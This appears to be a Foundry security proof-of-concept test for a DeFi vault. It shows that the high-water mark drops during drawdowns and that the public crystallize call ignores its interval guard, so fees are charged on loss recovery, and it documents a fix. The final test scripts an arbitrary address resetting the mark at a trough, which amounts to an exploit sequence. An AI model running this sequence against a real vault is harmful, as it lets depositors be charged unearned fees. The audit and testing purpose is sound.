// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// ──────────────────────────────────────────────────────────────────────────────
// SPRINT SECURITY TEST — High-Water Mark decreases on drawdown
//
// VULNERABILITY SUMMARY
// ─────────────────────
// Both `QueueModule._crystallize()` and `PerfFeeMixin._crystallize()` contain
// an identical logic error: when the current PPS ≤ the stored HWM (i.e., the
// vault is in drawdown), they LOWER the HWM to the current (depressed) PPS:
//
//   // QueueModule.sol lines 778-783
//   if (pps <= old) {
//       f.highWaterMark = pps;   // ← HWM is LOWERED — wrong
//       ...
//   }
//
//   // PerfFeeMixin.sol lines 85-89
//   if (pps <= old) {
//       perf.hwm = pps;          // ← identical bug in FixedMaturity path
//       ...
//   }
//
// A correct HWM is a MONOTONICALLY NON-DECREASING value. Lowering it during
// a drawdown lets the protocol charge performance fees on mere loss recovery —
// any subsequent PPS increase above the new (reduced) HWM triggers a fee,
// even though investors are still deeply underwater from their cost basis.
//
// COMPOUNDING FACTOR:
//   `endEpochCrystallize()` is ROLE_PUBLIC (SelectorRegistry.sol:137) and
//   `_crystallize()` has NO `minCrystallizeInterval` guard of its own.
//   The `canCrystallize()` view on CoreVault is ADVISORY ONLY — it is never
//   consulted inside `_crystallize()`.  Consequently:
//     (a) Anyone can crystallize at any time, including at the trough of a
//         drawdown, to deliberately set the HWM as low as possible.
//     (b) A manager can call `endEpochCrystallize()` again within the minimum
//         interval to collect fees on small yield bumps without restriction.
//
// IMPACT:
//   1. Performance fee extracted while the vault is in a loss position.
//   2. Minimum-interval guard for fees is completely unenforceable.
//   3. Any EOA or bot can manipulate the HWM to maximise fee extraction
//      by calling endEpochCrystallize() at the worst possible moment.
//
// FIX:
//   (A) In the drawdown branch, leave the HWM unchanged:
//         if (pps <= old) {
//             // Do NOT touch f.highWaterMark
//             f.lastCrystallize = uint64(block.timestamp);
//             emit Events.Crystallized(old, pps, 0);
//             return (old, 0);
//         }
//       Apply identically to PerfFeeMixin._crystallize() line 86.
//   (B) Move the interval guard INSIDE _crystallize() so it cannot be
//       bypassed via direct calls to endEpochCrystallize().
// ──────────────────────────────────────────────────────────────────────────────

import { Test } from "lib/forge-std/src/Test.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { IERC20Metadata } from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";

import { CoreHarness } from "../helpers/CoreHarness.sol";
import { MockUSDC } from "../helpers/MockUSDC.sol";
import { MockParamsProvider } from "../helpers/MockParamsProvider.sol";
import { ERC4626Module } from "../../src/core/modules/ERC4626Module.sol";
import { QueueModule } from "../../src/core/modules/QueueModule.sol";

contract HWM_Drawdown_POC is Test {
    // ── constants ─────────────────────────────────────────────────────────────
    address constant USDC_UNDERLYING = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;

    /// @dev 20 % performance fee rate in FixedPoint-WAD representation (0.2 × 1e18)
    uint256 constant PERF_RATE_20PCT = 2e17;

    // ── actors ────────────────────────────────────────────────────────────────
    address internal user;
    // address(this) is both owner AND feeCollector in the CoreHarness constructor

    // ── infra ─────────────────────────────────────────────────────────────────
    CoreHarness        internal core;
    MockUSDC           internal mock;
    MockParamsProvider internal params;

    // ──────────────────────────────────────────────────────────────────────────
    function setUp() public {
        user = makeAddr("user");

        // Etch MockUSDC at canonical USDC address
        mock = new MockUSDC();
        vm.etch(USDC_UNDERLYING, address(mock).code);

        params = new MockParamsProvider();
        core   = new CoreHarness(
            IERC20Metadata(USDC_UNDERLYING),
            "USDC Agg",
            "agUSDC",
            address(this), // owner
            address(this), // feeCollector ← perf fee shares land here
            address(params)
        );

        // Start with 0 % perf fee so initial setup crystallizations don't
        // charge fees, keeping totalSupply constant and PPS arithmetic clean.
        core.setPerfParamsUnsafe(0, 0);

        // User deposits 1 000 000 USDC → 1 000 000 shares, PPS = 1.0
        MockUSDC(USDC_UNDERLYING).mint(user, 1_000_000e6);
        vm.prank(user);
        IERC20(USDC_UNDERLYING).approve(address(core), type(uint256).max);
        vm.prank(user);
        ERC4626Module(address(core)).deposit(1_000_000e6, user);

        // Sanity: PPS = 1.0 (1 M assets / 1 M shares)
        assertEq(core.totalSupply(),                               1_000_000e6, "setup: totalSupply");
        assertEq(IERC20(USDC_UNDERLYING).balanceOf(address(core)), 1_000_000e6, "setup: hot balance");
    }

    // ── helpers ───────────────────────────────────────────────────────────────

    /// @dev Simulate yield: directly mint USDC into the vault (increases totalAssets)
    function _addToVault(uint256 amount) internal {
        MockUSDC(USDC_UNDERLYING).mint(address(core), amount);
    }

    /// @dev Simulate a loss: vault transfers USDC out to a dead address
    function _drainFromVault(uint256 amount) internal {
        vm.prank(address(core));
        IERC20(USDC_UNDERLYING).transfer(makeAddr("blackhole"), amount);
    }

    function _crystallize() internal {
        QueueModule(address(core)).endEpochCrystallize();
    }

    // ═════════════════════════════════════════════════════════════════════════
    // TEST 1 — HWM is unconditionally LOWERED on any drawdown crystallisation
    //
    // After establishing HWM = 1.1, a 90 % drawdown brings PPS to ≈ 0.09.
    // Calling endEpochCrystallize() resets the HWM to 0.09.
    // A partial recovery to PPS = 0.5 then satisfies `pps > hwm`, so
    // `canCrystallize()` returns TRUE — even though investors are still
    // 55 % below their original exit mark of 1.1.
    //
    // Correct behaviour: `canCrystallize()` should return FALSE here
    // (0.5 < original HWM 1.1).  It returns TRUE only because the HWM was
    // illegally reduced.
    // ═════════════════════════════════════════════════════════════════════════
    function test_hwm_decreases_on_drawdown_crystallise() public {
        // Establish HWM at 1.1 (10 % yield, 0 % fee, so PPS stays clean)
        _addToVault(100_000e6);              // totalAssets = 1.1 M → PPS = 1.1
        _crystallize();                       // pps > old(WAD=1.0) → HWM = 1.1

        // canCrystallize() should be false now: PPS == HWM (no profit left)
        assertFalse(core.canCrystallize(), "after crystallize at PPS=1.1: canCrystallize must be false");

        // 90 % drawdown: remove 1 M → vault has 100 k, PPS ≈ 0.0909
        _drainFromVault(1_000_000e6);

        // BUG: endEpochCrystallize() at the trough resets HWM from 1.1 → 0.09
        _crystallize();

        // Partial recovery: add 400 k → vault = 500 k, PPS = 0.5
        _addToVault(400_000e6);

        // ── THE BUG MANIFESTS ─────────────────────────────────────────────────
        // With a correct (non-decreasing) HWM: PPS 0.5 < HWM 1.1 → false
        // With the buggy lowered HWM:          PPS 0.5 > HWM 0.09 → true
        bool canCrystalliseNow = core.canCrystallize();
        assertTrue(
            canCrystalliseNow,
            "BUG CONFIRMED: canCrystallize() returns true at PPS=0.5 because HWM was reset to 0.09 during drawdown"
        );
        // NOTE: When the fix is applied (HWM monotonically non-decreasing),
        //       this assertion will FAIL, confirming the fix works.
    }

    // ═════════════════════════════════════════════════════════════════════════
    // TEST 2 — Performance fee is extracted while investors are in a net loss
    //
    // Same drawdown scenario as Test 1, but now with a 20 % perf fee active.
    // After the HWM is reset to 0.09, a recovery to PPS = 0.5 triggers fee
    // collection on the "gain" from 0.09 → 0.5.
    //
    // The user deposited at PPS = 1.0; the vault stands at PPS ≈ 0.44 after
    // the fee dilution (still ~56 % below deposit price).  The protocol has
    // nevertheless captured a substantial performance fee.
    // ═════════════════════════════════════════════════════════════════════════
    function test_perf_fee_extracted_on_loss_recovery() public {
        // Establish HWM at 1.1 with 0 % fee (clean setup)
        _addToVault(100_000e6);
        _crystallize();   // HWM = 1.1, no fee shares minted

        // 90 % drawdown → PPS ≈ 0.0909
        _drainFromVault(1_000_000e6);

        // Crystallize at trough — resets HWM to ≈ 0.09 (BUG)
        _crystallize();

        // Switch on the production-level 20 % perf fee
        core.setPerfParamsUnsafe(PERF_RATE_20PCT, 0);

        // Partial recovery: vault = 500 k, PPS = 0.5 (still 50 % below deposit of 1.0)
        _addToVault(400_000e6);

        uint256 feeCollectorSharesBefore = core.balanceOf(address(this));

        // Crystallize — should NOT charge fee (PPS 0.5 still below original HWM 1.1)
        // BUG: it DOES charge fee because HWM was illegally reset to 0.09
        _crystallize();

        uint256 feeCollectorSharesAfter = core.balanceOf(address(this));
        uint256 feeSharesMinted         = feeCollectorSharesAfter - feeCollectorSharesBefore;

        assertGt(
            feeSharesMinted,
            0,
            "BUG CONFIRMED: performance fee minted while PPS is 50 % below user deposit price of 1.0"
        );

        // ── Quantify the economic damage ──────────────────────────────────────
        // At PPS ≈ 0.5 the ~100 k USDC fee means users lost ~55 % AND paid fees.
        uint256 totalSharesAfter = core.totalSupply();
        // Approximate fee value in USDC: feeShares / totalShares * vaultBalance
        uint256 vaultBal = IERC20(USDC_UNDERLYING).balanceOf(address(core));
        uint256 feeValueApprox = feeSharesMinted * vaultBal / totalSharesAfter;

        // Fee should be ≈ 20 % of (500 k − 100 k) = 80 k USDC
        assertGt(feeValueApprox, 50_000e6, "Fee exceeds 50 k USDC while investors are in a loss position");

        // User's share value after fee dilution: still below their deposit (1 M USDC)
        uint256 userShareValue = core.balanceOf(user) * vaultBal / totalSharesAfter;
        assertLt(
            userShareValue,
            1_000_000e6,
            "User share value is less than their deposit -- they paid fees on their own loss"
        );
    }

    // ═════════════════════════════════════════════════════════════════════════
    // TEST 3 — minCrystallizeInterval is completely unenforceable
    //
    // `canCrystallize()` in CoreVault checks `block.timestamp < last + interval`,
    // but _crystallize() has NO such check.  endEpochCrystallize() is ROLE_PUBLIC
    // and calls _crystallize() directly, bypassing the advisory guard.
    //
    // A manager can therefore call endEpochCrystallize() twice in the same block:
    // once on a genuine yield bump and again on a second yield bump — extracting
    // two rounds of fees despite a 7-day minimum interval.
    // ═════════════════════════════════════════════════════════════════════════
    function test_interval_guard_is_advisory_only() public {
        // Activate 20 % perf fee with a 7-day minimum crystallisation interval
        core.setPerfParamsUnsafe(PERF_RATE_20PCT, 7 days);

        // ── First crystallisation (legitimate) ───────────────────────────────
        _addToVault(100_000e6); // PPS = 1.1

        uint256 feeBefore1 = core.balanceOf(address(this));
        _crystallize();          // fee charged on 100 k profit
        uint256 feeAfter1  = core.balanceOf(address(this));
        assertGt(feeAfter1 - feeBefore1, 0, "First crystallize: fee expected");

        // `canCrystallize()` correctly reports the interval has not elapsed
        assertFalse(
            core.canCrystallize(),
            "After first crystallize: canCrystallize() must be false (interval not elapsed)"
        );

        // ── Second crystallisation in the SAME block ─────────────────────────
        // Add more yield to push PPS above the new (post-dilution) HWM
        _addToVault(200_000e6); // total vault ≈ 1.3 M+, PPS well above new HWM

        uint256 feeBefore2 = core.balanceOf(address(this));

        // BUG: endEpochCrystallize() succeeds despite canCrystallize() == false
        _crystallize();

        uint256 feeAfter2 = core.balanceOf(address(this));

        assertGt(
            feeAfter2 - feeBefore2,
            0,
            "BUG CONFIRMED: second performance fee minted in the same block (7-day interval ignored)"
        );
    }

    // ═════════════════════════════════════════════════════════════════════════
    // TEST 4 — Full exploit: any EOA resets HWM at trough, protocol extracts
    //          fees on recovery while investors are still massively underwater
    //
    // Combines all three bugs in one realistic scenario:
    //   (a) ROLE_PUBLIC means ANY address can call endEpochCrystallize()
    //   (b) No interval guard → can be called at any moment
    //   (c) HWM decreases → reset at the worst possible trough
    //
    // The vault starts at PPS = 1.0.  A 10 M USDC "yield" pushes PPS to 10.
    // After a 95 % crash (PPS = 0.5), a griever/operator resets the HWM to 0.5.
    // When the vault recovers to PPS = 2.0 (still -80 % from peak HWM of 10),
    // the protocol charges 20 % perf fees on the 0.5 → 2.0 "recovery".
    // ═════════════════════════════════════════════════════════════════════════
    function test_full_exploit_hwm_reset_at_trough() public {
        core.setPerfParamsUnsafe(0, 0); // 0 % fee for HWM setup phase

        // Simulate 10x vault growth: totalAssets = 10 M, PPS = 10.0
        _addToVault(9_000_000e6);
        _crystallize();   // HWM = 10.0

        // Confirm: canCrystallize() is false (PPS == HWM, no new profit)
        assertFalse(core.canCrystallize(), "HWM established at 10.0: canCrystallize must be false");

        // 95 % crash: vault drops from 10 M to 500 k, PPS = 0.5
        _drainFromVault(9_500_000e6);

        // ── ANYONE can now reset the HWM (ROLE_PUBLIC, no interval guard) ────
        address griever = makeAddr("griever");
        vm.prank(griever);
        QueueModule(address(core)).endEpochCrystallize(); // HWM reset: 10.0 → 0.5 (BUG)

        // Enable 20 % perf fee for the recovery phase
        core.setPerfParamsUnsafe(PERF_RATE_20PCT, 0);

        // Vault recovers to 2 M (PPS = 2.0 — still 80 % below original HWM of 10.0)
        _addToVault(1_500_000e6); // 500 k + 1.5 M = 2 M total

        uint256 feeSharesBefore = core.balanceOf(address(this));
        _crystallize();
        uint256 feeSharesAfter  = core.balanceOf(address(this));
        uint256 feeSharesMinted = feeSharesAfter - feeSharesBefore;

        assertGt(
            feeSharesMinted,
            0,
            "CRITICAL: performance fee extracted at PPS=2.0 -- investors are still 80% below peak HWM of 10.0"
        );

        // Approximate fee value: ~20 % of (2 M − 500 k) = ~300 k USDC
        uint256 vaultBal   = IERC20(USDC_UNDERLYING).balanceOf(address(core));
        uint256 totalShares = core.totalSupply();
        uint256 feeValue   = feeSharesMinted * vaultBal / totalShares;

        assertGt(feeValue, 200_000e6, "Fee exceeds 200 k USDC while investors are 80 % underwater from peak");

        // Users deposited at PPS=1.0, vault PPS is now ~1.7 (after dilution):
        // they appear to be "in profit" from deposit price but are 83% below peak.
        // The protocol captured 300 k+ USDC in fees on their loss recovery.
        uint256 userValue = core.balanceOf(user) * vaultBal / totalShares;
        assertGt(userValue, 1_000_000e6, "User is nominally above deposit price at PPS~2 -- yet fees were charged at peak-HWM-loss");
    }
}
